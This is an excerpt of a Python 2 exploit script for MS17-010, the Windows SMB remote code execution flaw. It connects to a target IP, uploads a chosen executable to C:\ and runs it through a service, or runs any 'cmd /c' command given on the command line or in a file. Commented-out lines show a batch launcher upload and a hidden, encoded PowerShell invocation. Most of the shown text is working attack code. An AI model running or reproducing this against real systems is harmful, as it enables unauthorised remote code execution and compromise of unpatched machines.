...
def exploit(target, pipe_name, exploit_cmd, exploit_exec_file):
	conn = MYSMB(target)
	...
	print 'Connecting with user : pass ' + USERNAME + ' : ' + PASSWORD
	...
	# ================================	
	try:
		smb_pwn(conn, info['arch'], exploit_cmd, exploit_exec_file)
	except:
		pass
...
# exploit(target, pipe_name, exploit_cmd, exploit_exec_file):

def smb_pwn(conn, arch, exploit_cmd, exploit_exec_file):
	smbConn = conn.get_smbconnection()
	
	if exploit_exec_file:
		# upload file and execture it
		fname = ''.join(exploit_exec_file.split('/')[-1:])
		ename = 'c:\\' + ''.join(fname)
		print "Uploading ", exploit_exec_file, "as:", ename
		smb_send_file(smbConn, exploit_exec_file, 'C', fname)
		cmd_string = 'cmd /c ' + ''.join(ename)
		# print "Attempting to execute: " + ''.join(cmd_string)
		service_exec(conn, cmd_string)
		print '*****************************************************************'
		print '*****************************************************************'
		print '!!!!! You are on the hook to cleanup uploaded files !!!!'
		print '!!!!! Keep track of where you upload files!!!!'
		print '*****************************************************************'
		print '*****************************************************************'
	else:
		# no file to uplaod. just execute the passed command
		cmd_string = 'cmd /c ' + ''.join(exploit_cmd)
		print 'Executing command: ' + ''.join(cmd_string)
		service_exec(conn, cmd_string)
	...
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
	# smb_send_file(smbConn, '/root/working/launcher.bat', 'C', '/launcher.bat')
	# service_exec(conn, r'cmd /c c:\launcher.bat')
	# service_exec(conn, r'cmd /c powershell -noP -sta -w 1 -enc  ')
...
def service_exec(conn, cmd):
	...
	print 'Service_exec cmd: ' + ''.join(cmd)
...
# -u --username Username 
# -p --password Password
# -c --cmd command to inject 'cmd /c dir c:'
# -f --file File with command to inject
# -e --execfile
# -i --ip ip address of system to exploit
# -n --namedpipe - named pipe that is accessable
# 
parser = argparse.ArgumentParser(description="MS17-010 Exploit")
parser.add_argument("-i", "--ip", required=True, help="The target IP Address")
parser.add_argument("-n", "--namedpipe", default='', help="Accessable Nameed-Piipe to use in exploit.")
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument("-c", "--cmd", help="The command to be pushed to the target. Should include cmd /c or powershell....")
group.add_argument("-f", "--file_cmd", type=argparse.FileType('r'), help="File containing the command to be pushed at the target. It will be sent exactly as fromated in the file.")
group.add_argument("-e", "--execfile", help="Path to file copied to c:\ of exploited system. Cleanup is left to the user.")
...
print "Target ip address: ", args.ip
print "Named Pipe to use: ", args.namedpipe
print "cmd = ", args.cmd
print "username: ", USERNAME
print "password: ", PASSWORD
if args.file_cmd:
	cmd_string = args.file_cmd.read().replace('\n','')
	# cmd_string = args.file_cmd.read()
	print "Command from file: ", cmd_string
else:
	print "Command from file: ", args.file_cmd
print "ExecFile Name: ", args.execfile

# exploit(target, pipe_name, exploit_cmd, exploit_exec_file):

if args.file_cmd:
	print "Exploit using command from file:", args.file_cmd.name
	# print "command string: ", cmd_string
	exploit(args.ip, args.namedpipe, cmd_string,None)
else:
	print "Exploit using commnd line or executable upload." 
	print 'Command Line:', args.cmd
	print 'Executable Name:', args.execfile
	exploit(args.ip, args.namedpipe, args.cmd, args.execfile)
print 'Done.'
# args.file_cmd.close